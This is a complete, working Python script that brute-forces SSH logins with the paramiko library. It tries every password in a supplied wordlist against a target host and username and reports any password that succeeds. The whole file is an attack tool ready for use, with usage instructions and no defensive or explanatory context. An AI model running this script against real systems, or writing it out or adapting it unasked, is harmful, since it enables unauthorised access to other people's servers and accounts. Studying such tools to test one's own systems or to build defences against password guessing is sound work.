#!/usr/bin/python

import paramiko
import sys
from time import sleep

def ssh_brute(host, port, username, wordlist_path):
    with open(wordlist_path, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"Trying password: {password}")
            client.connect(hostname=host, port=port, username=username, password=password, timeout=5, banner_timeout=10)
            print(f"\n[SUCCESS] Password found: {password}")
            client.close()
            return
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"[!] Connection error: {e}")
            sleep(1)
        finally:
            client.close()

    print("\n[FAILURE] Password not found.")


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("[HELP] Usage: python3 ssh_bruteforce.py <host> <port> <username> <wordlist>")
        sys.exit(1)

    ssh_brute(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4])
